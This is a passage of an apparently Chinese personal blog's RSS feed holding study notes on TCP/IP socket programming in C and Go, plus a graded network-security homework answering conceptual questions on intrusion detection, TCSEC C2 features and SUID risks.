style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; sockaddr_in&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;sa_family_t&lt;/span&gt;      sin_family; &lt;span style=&#34;color:#75715e&#34;&gt;//地址族&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;         sin_port;   &lt;span style=&#34;color:#75715e&#34;&gt;//16位TCP/UDP地址&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; in_addr          sin_addr;  &lt;span style=&#34;color:#75715e&#34;&gt;//32位ip地址&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;             sin_zero[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;];    &lt;span style=&#34;color:#75715e&#34;&gt;//不使用&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;};&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;in_addr&lt;/code&gt;定义如下，它用来存放32位IP地址&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; in_addr&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;In_addr_t    s_addr;  &lt;span style=&#34;color:#75715e&#34;&gt;//32位IPv4地址&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.1a3tohqxb3ts.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看到 &lt;code&gt;in_addr_t&lt;/code&gt; 实际上是 &lt;code&gt;uint32_t&lt;/code&gt;也就是无符号32位bit，那为什么需要额外定义这些数据类型呢? 如前所述,这是考虑到扩展性的结果。如果使用int32_t类型的数据,就能保证在任何时候都占用4字节,即使将来用64位表示int类型也是如此。&#xA;从之前介绍的代码也可看出,&lt;code&gt;sockaddr_in&lt;/code&gt;结构体变量地址值将以如下方式传递给&lt;code&gt;bind&lt;/code&gt;函数。&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; sockaddr_in serv_addr; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bind&lt;/span&gt;(serv_sock,(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; sockaddr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;serv_addr, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(Serv_addr))&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;error_handling&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bind()error&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此处重要的是第二个参数的传递。实际上,bind函数的第二个参数期望得到&lt;code&gt;sockaddr&lt;/code&gt;结构体变量地址值,包括地址族、端口号、IP地址等。（此处进行了强制类型转换,将&lt;code&gt;sockaddr_in&lt;/code&gt;转成&lt;code&gt;sockaddr&lt;/code&gt;）从下列代码也可看出,直接向sockaddr结构体填充这些信息会带来麻烦。&lt;/p&gt;</description>
    </item>
    <item>
      <title>网络安全作业4</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A4/</link>
      <pubDate>Wed, 15 Nov 2023 18:44:57 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A4/</guid>
      <description>&lt;p&gt;得分：10/10&lt;/p&gt;&#xA;&lt;h2 id=&#34;第六讲&#34;&gt;第六讲&lt;/h2&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;IDS有哪些主要功能?&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;网络流量的跟踪与分析功能&lt;/strong&gt;：跟踪用户进出网络的所有活动，实时检测并分析用户在系统中的活动状态；实时统计网络流量，检测拒绝服务攻击等异常行为。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;已知攻击特征的识别功能&lt;/strong&gt;：识别特定类型的攻击，并向控制台报警，为网络防护提供依据。根据定制的条件过滤重复告警事件，减轻传输与响应的压力。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;异常行为的分析、统计与响应功能&lt;/strong&gt;：分析系统的异常行为模式，统计异常行为，并对异常行为做出响应。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;特征库的在线和离线升级功能&lt;/strong&gt;：提供入侵检测规则的在线和离线升级，实时更新入侵特征库，不断提高IDS的入侵检测能力。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;数据文件的完整性检查功能&lt;/strong&gt;：检查关键数据文件的完整性，识别并报告数据文件的改动情况。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;自定义的响应功能&lt;/strong&gt;：定制实时响应策略；根据用户定义，经过系统过滤，对告警事件及时响应。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;系统漏洞的预报警功能&lt;/strong&gt;：对新发现或新公布的系统漏洞特征进行预报警。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;IDS探测器集中管理功能&lt;/strong&gt;：通过控制台收集探测器的状态和告警信息，控制各个探测器的行为。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;简述误用检测和异常检测。&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;误用检测技术又称基于知识或特征的检测技术。它假定所有入侵行为和手段(及其变种)都能够表达为一种模式或特征，并对已知的入侵行为和手段进行分析，提取入侵特征，构建攻击模式或攻击签名，通过系统当前状态与攻击模式或攻击签名的匹配判断入侵行为。误用检测是最成熟、应用最广泛的技术。&lt;/li&gt;&#xA;&lt;li&gt;异常检测技术又称为基于行为的入侵检测技术，用来检测系统（主机或网络）中的异常行为。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;总结NIDS的脆弱性。&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;检测的工作量很大&lt;/strong&gt;：NIDS需要高效的检测方法和大量的系统资源。容易遭受DoS攻击。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;检测方法局限性&lt;/strong&gt;：特征匹配方法有其固有缺陷，难以完全检测入侵行为。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;网络协议复杂性&lt;/strong&gt;：NIDS难以精确分析复杂的网络协议。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;系统实现差异&lt;/strong&gt;：NIDS难以完全兼容不同系统的实现方式。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;简述网络安全态势感知系统。&lt;/p&gt;&#xA;&lt;p&gt;网络安全态势感知系统可以看成是基于分布式入侵检测系统的综合安全监控系统，具有入侵检测、安全状态可视化展示、安全状态理解及趋势分析预测，以及网络监视和网络控制等功能。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id=&#34;第七讲&#34;&gt;第七讲&lt;/h2&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;简述TCSEC(受信计算机系统评测标准)标准的C2安全级4项关键功能。&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;安全登录机制&lt;/strong&gt;&#xA;要求系统提供强大的用户身份验证机制，防止未经授权的用户登录系统。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;自主访问控制机制&lt;/strong&gt;&#xA;要求系统提供自主访问控制机制，允许系统管理员根据需要对系统资源进行访问控制。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;安全审计机制&lt;/strong&gt;&#xA;系统必须提供安全审计机制，以记录系统的关键操作，以便在发生安全事件时进行调查。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;对象重用保护机制&lt;/strong&gt;&#xA;对象重用保护机制就是残留信息的处理机制，即：阻止一个用户利用或阅读另一个用户已删除的数据，或访问另一个用户曾经使用并释放的内存。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;在哪些情况下可能会发生输入验证攻击。&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;程序无法辨认语法上不正确的输入。&lt;/li&gt;&#xA;&lt;li&gt;模块接受了无关的输入。&lt;/li&gt;&#xA;&lt;li&gt;模块没有能够处理遗漏的输入域。&lt;/li&gt;&#xA;&lt;li&gt;发生了域值相关性错误。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;为什么root对其可执行文件设置用户ID许可会带来严重的安全隐患?&lt;/p&gt;&#xA;&lt;p&gt;因为当某可执行文件是root创建的，如果设置了SUID，而该可执行文件又被赋予了其他普通用户的可执行权限，则该程序被任何用户运行时，对应的进程的euid是root，该进程可以访问任何文件。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;</description>
    </item>
    <item>
      <title>TCP、IP网络编程第二章笔记</title>
      <link>//localhost:64783/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Sat, 11 Nov 2023 12:48:30 +0800</pubDate>
      <guid>//localhost:64783/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;21-套接字协议及其数据传输特性&#34;&gt;2.1 套接字协议及其数据传输特性&lt;/h1&gt;&#xA;&lt;h2 id=&#34;协议&#34;&gt;协议&lt;/h2&gt;&#xA;&lt;p&gt;如果相隔很远的两人想展开对话,必须先决定对话方式。如果一方使用电话,那么另一方也只能使用电话,而不是书信。可以说,电话就是两人对话的协议。协议是对话中使用的通信规则, 把上述概念拓展到计算机领域可整理为“&lt;strong&gt;计算机间对话必备通信规则&lt;/strong&gt;”。&lt;/p&gt;&#xA;&lt;h2 id=&#34;创建套接字&#34;&gt;创建套接字&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/socket.h&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; domain, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; type, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; protocol); &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//成功时返回文件描述符,失败时返回-1。&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//domain 套接字中使用的协议族(Protocol Family)信息。&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//type 套接字数据传输类型信息。&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//protocol 计算机间通信中使用的协议信息。&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 Go 语言的 &lt;code&gt;syscall&lt;/code&gt; 包中，&lt;code&gt;Socket&lt;/code&gt; 函数是对底层 &lt;code&gt;socket&lt;/code&gt; 系统调用的封装。这样做的目的是为了提供一个更加 Go 风格（例如错误处理）的接口，同时隐藏一些底层细节。&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;Socket&lt;/code&gt; 函数内部调用了 &lt;code&gt;socket&lt;/code&gt; 函数。&lt;code&gt;socket&lt;/code&gt; 函数直接执行了系统调用，并返回了原始的结果，包括一个文件描述符和一个错误号。然后 &lt;code&gt;Socket&lt;/code&gt; 函数将这些原始结果转换为 Go 风格的结果：如果系统调用成功，它返回一个文件描述符和一个 &lt;code&gt;nil&lt;/code&gt; 错误；如果系统调用失败，它返回一个 &lt;code&gt;-1&lt;/code&gt; 文件描述符和一个非 &lt;code&gt;nil&lt;/code&gt; 错误。&lt;/p&gt;&#xA;&lt;p&gt;这样做的好处是，对于大多数 Go 程序员来说，他们只需要关心 &lt;code&gt;Socket&lt;/code&gt; 函数，而不需要了解底层的 &lt;code&gt;socket&lt;/code&gt; 系统调用和错误处理。&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Socket 函数创建一个新的套接字，并返回其文件描述符和可能的错误。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// domain 参数指定了套接字的协议族（例如，AF_INET 代表 IPv4，AF_INET6 代表 IPv6）。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// typ 参数指定了套接字的类型（例如，SOCK_STREAM 代表 TCP，SOCK_DGRAM 代表 UDP）。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// proto 参数指定了套接字使用的协议（例如，IPPROTO_TCP 代表 TCP，IPPROTO_UDP 代表 UDP）。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Socket&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;typ&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;proto&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;) (&lt;span style=&#34;color:#a6e22e&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 如果 domain 是 AF_INET6（即，我们正在尝试创建一个 IPv6 套接字），&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 但是 SocketDisableIPv6 为 true（即，我们禁用了 IPv6），则返回错误 EAFNOSUPPORT。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;AF_INET6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SocketDisableIPv6&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;EAFNOSUPPORT&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 调用底层的 socket 函数创建套接字。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;fd&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;typ&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;proto&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// socket 函数创建一个新的套接字，并返回其文件描述符和可能的错误。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// domain 参数指定了套接字的协议族（例如，AF_INET 代表 IPv4，AF_INET6 代表 IPv6）。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// typ 参数指定了套接字的类型（例如，SOCK_STREAM 代表 TCP，SOCK_DGRAM 代表 UDP）。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// proto 参数指定了套接字使用的协议（例如，IPPROTO_TCP 代表 TCP，IPPROTO_UDP 代表 UDP）。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// rawSyscall 函数执行一个底层的系统调用，其参数是系统调用的编号和参数。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 如果系统调用失败，它返回一个非零的错误号 e1，我们将其转换为 Go 的 error 类型并返回。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;typ&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;proto&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;) (&lt;span style=&#34;color:#a6e22e&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;r0&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;e1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rawSyscall&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;abi&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FuncPCABI0&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;libc_socket_trampoline&lt;/span&gt;), uintptr(&lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt;), uintptr(&lt;span style=&#34;color:#a6e22e&#34;&gt;typ&lt;/span&gt;), uintptr(&lt;span style=&#34;color:#a6e22e&#34;&gt;proto&lt;/span&gt;))&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;fd&lt;/span&gt; = int(&lt;span style=&#34;color:#a6e22e&#34;&gt;r0&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;errnoErr&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;e1&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;协议族protocol-family&#34;&gt;协议族(Protocol Family)&lt;/h2&gt;&#xA;&lt;p&gt;通过socket函数的第一个参数传递套接字中使用的协议分类信息。此协议分类信息称为协议族。&#xA;原文给的c语言头文件中的分类&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.3ptuslo70nq.png&#34; alt=&#34;image&#34;&gt;&#xA;在 Go 语言的 &lt;code&gt;syscall&lt;/code&gt; 包中，&lt;code&gt;domain&lt;/code&gt; 参数用于指定套接字的协议族。以下是一些常见的 &lt;code&gt;domain&lt;/code&gt; 值：&lt;/p&gt;</description>
    </item>
    <item>
      <title>TCP、IP网络编程第一章笔记</title>
